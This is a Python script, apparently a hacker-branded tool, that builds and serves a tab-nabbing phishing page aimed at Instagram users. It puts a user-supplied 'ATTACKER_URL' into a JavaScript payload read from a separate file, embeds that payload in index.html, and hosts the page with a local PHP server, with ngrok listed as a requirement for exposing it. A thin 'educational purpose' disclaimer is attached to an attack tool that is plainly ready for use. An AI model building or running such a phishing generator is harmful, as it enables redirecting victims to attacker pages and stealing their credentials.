#!/usr/bin/python
import os
import re
import time
import colorama
from urllib.parse import urlparse
from distutils.spawn import find_executable

class ExploitPoC:

	def __init__(self, __webURL, __redirectURL):
		self.__webURL = __webURL
		self.__redirectURL = __redirectURL

def main():

	os.system("cls") if os.name == "nt" else os.system("clear")

	# banner
	def banner():
		banner_txt = colorama.Fore.RED + """
	██╗ ██████╗ ███████╗██████╗ ██╗      ██████╗ ██╗████████╗
	██║██╔════╝ ██╔════╝██╔══██╗██║     ██╔═████╗██║╚══██╔══╝
	██║██║  ███╗███████╗██████╔╝██║     ██║██╔██║██║   ██║   
	██║██║   ██║╚════██║██╔═══╝ ██║     ████╔╝██║██║   ██║   
	██║╚██████╔╝███████║██║     ███████╗╚██████╔╝██║   ██║   
	╚═╝ ╚═════╝ ╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝
	Coded by: An0nym0us H4ck3r """ + colorama.Fore.YELLOW + "\n\t[+] Tab Nabbing Exploit for " + colorama.Fore.LIGHTMAGENTA_EX + "Instagram" + colorama.Fore.RESET

		return banner_txt

	def disclaimer():
		return colorama.Fore.GREEN + "\n\tDisclaimer:-" + colorama.Fore.LIGHTBLUE_EX + """This tool is made for educational purpose and should only be tested within your own lab environment.
		"""


	def requirements():

		reqPrograms = [ './php/php.exe', 'ngrok.exe' ]
		_isFound = True

		for program in reqPrograms:
			if find_executable(program) is None:
				print(colorama.Fore.RED + "[-] " + program + " not found.")
				_isFound = False

		if _isFound == False:
			print(colorama.Fore.YELLOW + "\n[!] Download the program again from GitHub!")

		print(colorama.Fore.WHITE)

	print(banner())
	print(disclaimer())

	def validateurl(x):

		if len(x) < 1:
			return False

		try:
			result = urlparse(x)
			return all([result.scheme, result.netloc])
		except AttributeError:
			raise False
	
	try:
		__webURL = str(input(colorama.Fore.YELLOW + "[+] Enter main URL: " + colorama.Fore.RESET))	# innocent URL
		__redirectURL = str(input(colorama.Fore.YELLOW + "[+] Enter redirect URL: "+ colorama.Fore.RESET))	# redirection URL
	except KeyboardInterrupt :
		print(colorama.Fore.RED + "[!] Program exited by user" + colorama.Fore.RESET )
		exit(0)

	obj = ExploitPoC(__webURL, __redirectURL)

	if validateurl(__webURL) == False:
		print(colorama.Fore.YELLOW + "[!]" + __webURL + " is an invalid URL" + colorama.Fore.RESET )
		exit(0)

	if validateurl(__redirectURL) == False:
		print(colorama.Fore.YELLOW + "[!]" + __redirectURL + " is an invalid URL" + colorama.Fore.RESET )
		exit(0)

	print( colorama.Fore.CYAN + "[!] Generating Obfuscated Payload...")
	time.sleep(5)

	with open('payload.txt', 'r', encoding="UTF-8") as e:
		exploitContent = e.read()
		exploitContent = exploitContent.replace("MAIN_URL", __webURL)
		exploitContent = exploitContent.replace("ATTACKER_URL", __redirectURL)
	print( colorama.Fore.CYAN + "[!] Embedding Payload into web page..." )
	time.sleep(8)
	f = open('index.html', 'w')
	exploitContent = f"""
		<body><script>{exploitContent}</script></body>	
	"""
	f.write(exploitContent)
	f.close()
	print( colorama.Fore.GREEN + "[+] Payload Generated." )
	time.sleep(5)
	print( colorama.Fore.CYAN + "[!] Starting PHP Server.." )
	time.sleep(10)
	try:
		os.system("php\\php.exe -S localhost:80 -t \"..\\PythonExploit\"")
	except KeyboardInterrupt:
		print(colorama.Fore.RED + "[!] Program exited by user" + colorama.Fore.RESET )
		exit(0)


if __name__ == "__main__":
	main()